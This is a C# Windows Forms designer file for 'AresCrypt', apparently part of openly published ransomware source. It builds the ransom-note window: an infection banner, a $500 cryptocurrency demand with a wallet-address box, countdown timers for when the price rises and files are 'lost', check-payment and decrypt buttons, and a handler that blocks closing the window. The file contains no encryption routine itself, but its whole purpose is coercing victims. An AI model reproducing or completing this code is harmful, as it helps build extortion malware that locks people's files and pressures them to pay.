namespace arescrypt
{
    partial class Display
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
                components.Dispose();
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Display));
            this.label1 = new System.Windows.Forms.Label();
            this.displayMessage = new System.Windows.Forms.TextBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.paymentTimer_Rise = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.paymentTimer_Lost = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.copyBtn = new System.Windows.Forms.Button();
            this.cryptoAddress = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.checkpaymentBtn = new System.Windows.Forms.Button();
            this.decryptBtn = new System.Windows.Forms.Button();
            this.riseTimer = new System.Windows.Forms.Timer(this.components);
            this.aboutBitcoin = new System.Windows.Forms.LinkLabel();
            this.aboutLitecoin = new System.Windows.Forms.LinkLabel();
            this.aboutZcash = new System.Windows.Forms.LinkLabel();
            this.lostTimer = new System.Windows.Forms.Timer(this.components);
            this.uniqueKeyDisplay = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.Location = new System.Drawing.Point(0, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(100, 23);
            this.label1.TabIndex = 3;
            // 
            // displayMessage
            // 
            this.displayMessage.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.displayMessage.Location = new System.Drawing.Point(247, 49);
            this.displayMessage.Multiline = true;
            this.displayMessage.Name = "displayMessage";
            this.displayMessage.ReadOnly = true;
            this.displayMessage.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.displayMessage.Size = new System.Drawing.Size(625, 331);
            this.displayMessage.TabIndex = 1;
            this.displayMessage.Text = resources.GetString("displayMessage.Text");
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.BackgroundImage")));
            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.pictureBox1.Location = new System.Drawing.Point(12, 9);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(229, 207);
            this.pictureBox1.TabIndex = 2;
            this.pictureBox1.TabStop = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(278, 9);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(553, 37);
            this.label2.TabIndex = 4;
            this.label2.Text = "You have been infected by AresCrypt!\r\n";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.paymentTimer_Rise);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Location = new System.Drawing.Point(12, 222);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(229, 79);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            // 
            // paymentTimer_Rise
            // 
            this.paymentTimer_Rise.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.paymentTimer_Rise.ForeColor = System.Drawing.Color.White;
            this.paymentTimer_Rise.Location = new System.Drawing.Point(73, 40);
            this.paymentTimer_Rise.Name = "paymentTimer_Rise";
            this.paymentTimer_Rise.Size = new System.Drawing.Size(88, 24);
            this.paymentTimer_Rise.TabIndex = 1;
            this.paymentTimer_Rise.Text = "72:00:00\r\n";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(22, 16);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(187, 24);
            this.label3.TabIndex = 0;
            this.label3.Text = "Payment will Rise On";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.paymentTimer_Lost);
            this.groupBox2.Controls.Add(this.label6);
            this.groupBox2.Location = new System.Drawing.Point(12, 301);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(229, 79);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            // 
            // paymentTimer_Lost
            // 
            this.paymentTimer_Lost.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.paymentTimer_Lost.ForeColor = System.Drawing.Color.White;
            this.paymentTimer_Lost.Location = new System.Drawing.Point(68, 40);
            this.paymentTimer_Lost.Name = "paymentTimer_Lost";
            this.paymentTimer_Lost.Size = new System.Drawing.Size(93, 24);
            this.paymentTimer_Lost.TabIndex = 1;
            this.paymentTimer_Lost.Text = "168:00:00\r\n";
            // 
            // label6
            // 
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(6, 16);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(217, 24);
            this.label6.TabIndex = 0;
            this.label6.Text = "Your files will be lost on";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.copyBtn);
            this.groupBox3.Controls.Add(this.cryptoAddress);
            this.groupBox3.Controls.Add(this.label8);
            this.groupBox3.Location = new System.Drawing.Point(247, 386);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(625, 79);
            this.groupBox3.TabIndex = 7;
            this.groupBox3.TabStop = false;
            // 
            // copyBtn
            // 
            this.copyBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.copyBtn.Location = new System.Drawing.Point(439, 43);
            this.copyBtn.Name = "copyBtn";
            this.copyBtn.Size = new System.Drawing.Size(107, 23);
            this.copyBtn.TabIndex = 8;
            this.copyBtn.Text = "Copy";
            this.copyBtn.UseVisualStyleBackColor = true;
            // 
            // cryptoAddress
            // 
            this.cryptoAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cryptoAddress.Location = new System.Drawing.Point(19, 43);
            this.cryptoAddress.Multiline = true;
            this.cryptoAddress.Name = "cryptoAddress";
            this.cryptoAddress.ReadOnly = true;
            this.cryptoAddress.Size = new System.Drawing.Size(414, 23);
            this.cryptoAddress.TabIndex = 1;
            this.cryptoAddress.Text = "Crypto Address";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(15, 16);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(532, 24);
            this.label8.TabIndex = 0;
            this.label8.Text = "Send $500 USD worth of Bitcoin/Litecoin/Zcash to this address:";
            // 
            // checkpaymentBtn
            // 
            this.checkpaymentBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.checkpaymentBtn.Location = new System.Drawing.Point(247, 471);
            this.checkpaymentBtn.Name = "checkpaymentBtn";
            this.checkpaymentBtn.Size = new System.Drawing.Size(194, 37);
            this.checkpaymentBtn.TabIndex = 9;
            this.checkpaymentBtn.Text = "Check Payment";
            this.checkpaymentBtn.UseVisualStyleBackColor = true;
            this.checkpaymentBtn.Click += new System.EventHandler(this.checkpaymentBtn_Click);
            // 
            // decryptBtn
            // 
            this.decryptBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.decryptBtn.Location = new System.Drawing.Point(678, 471);
            this.decryptBtn.Name = "decryptBtn";
            this.decryptBtn.Size = new System.Drawing.Size(194, 37);
            this.decryptBtn.TabIndex = 10;
            this.decryptBtn.Text = "Decrypt";
            this.decryptBtn.UseVisualStyleBackColor = true;
            this.decryptBtn.Click += new System.EventHandler(this.decryptBtn_Click);
            // 
            // riseTimer
            // 
            this.riseTimer.Enabled = true;
            this.riseTimer.Interval = 1000;
            this.riseTimer.Tick += new System.EventHandler(this.riseTimer_Tick);
            // 
            // aboutBitcoin
            // 
            this.aboutBitcoin.AutoSize = true;
            this.aboutBitcoin.LinkColor = System.Drawing.Color.White;
            this.aboutBitcoin.Location = new System.Drawing.Point(62, 402);
            this.aboutBitcoin.Name = "aboutBitcoin";
            this.aboutBitcoin.Size = new System.Drawing.Size(70, 13);
            this.aboutBitcoin.TabIndex = 11;
            this.aboutBitcoin.TabStop = true;
            this.aboutBitcoin.Text = "About Bitcoin";
            this.aboutBitcoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBitcoin_LinkClicked);
            // 
            // aboutLitecoin
            // 
            this.aboutLitecoin.AutoSize = true;
            this.aboutLitecoin.LinkColor = System.Drawing.Color.White;
            this.aboutLitecoin.Location = new System.Drawing.Point(62, 434);
            this.aboutLitecoin.Name = "aboutLitecoin";
            this.aboutLitecoin.Size = new System.Drawing.Size(76, 13);
            this.aboutLitecoin.TabIndex = 12;
            this.aboutLitecoin.TabStop = true;
            this.aboutLitecoin.Text = "About LiteCoin";
            this.aboutLitecoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutLitecoin_LinkClicked);
            // 
            // aboutZcash
            // 
            this.aboutZcash.AutoSize = true;
            this.aboutZcash.LinkColor = System.Drawing.Color.White;
            this.aboutZcash.Location = new System.Drawing.Point(62, 471);
            this.aboutZcash.Name = "aboutZcash";
            this.aboutZcash.Size = new System.Drawing.Size(68, 13);
            this.aboutZcash.TabIndex = 13;
            this.aboutZcash.TabStop = true;
            this.aboutZcash.Text = "About Zcash";
            this.aboutZcash.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutZcash_LinkClicked);
            // 
            // lostTimer
            // 
            this.lostTimer.Enabled = true;
            this.lostTimer.Interval = 1000;
            this.lostTimer.Tick += new System.EventHandler(this.lostTimer_Tick);
            // 
            // uniqueKeyDisplay
            // 
            this.uniqueKeyDisplay.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.uniqueKeyDisplay.Location = new System.Drawing.Point(448, 486);
            this.uniqueKeyDisplay.Name = "uniqueKeyDisplay";
            this.uniqueKeyDisplay.ReadOnly = true;
            this.uniqueKeyDisplay.Size = new System.Drawing.Size(224, 22);
            this.uniqueKeyDisplay.TabIndex = 14;
            this.uniqueKeyDisplay.Text = "Unique ID";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.label4.Location = new System.Drawing.Point(448, 471);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(83, 13);
            this.label4.TabIndex = 15;
            this.label4.Text = "Unique User ID:";
            // 
            // Display
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(882, 520);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.uniqueKeyDisplay);
            this.Controls.Add(this.aboutZcash);
            this.Controls.Add(this.aboutLitecoin);
            this.Controls.Add(this.aboutBitcoin);
            this.Controls.Add(this.decryptBtn);
            this.Controls.Add(this.checkpaymentBtn);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.displayMessage);
            this.Controls.Add(this.label1);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Display";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "AresCrypt";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.preventClose);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label paymentTimer_Rise;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Label paymentTimer_Lost;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Button copyBtn;
        private System.Windows.Forms.TextBox cryptoAddress;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Button checkpaymentBtn;
        private System.Windows.Forms.Button decryptBtn;
        private System.Windows.Forms.Timer riseTimer;
        private System.Windows.Forms.LinkLabel aboutBitcoin;
        private System.Windows.Forms.LinkLabel aboutLitecoin;
        private System.Windows.Forms.LinkLabel aboutZcash;
        private System.Windows.Forms.Timer lostTimer;
        public System.Windows.Forms.TextBox displayMessage;
        public System.Windows.Forms.TextBox uniqueKeyDisplay;
        private System.Windows.Forms.Label label4;
    }
}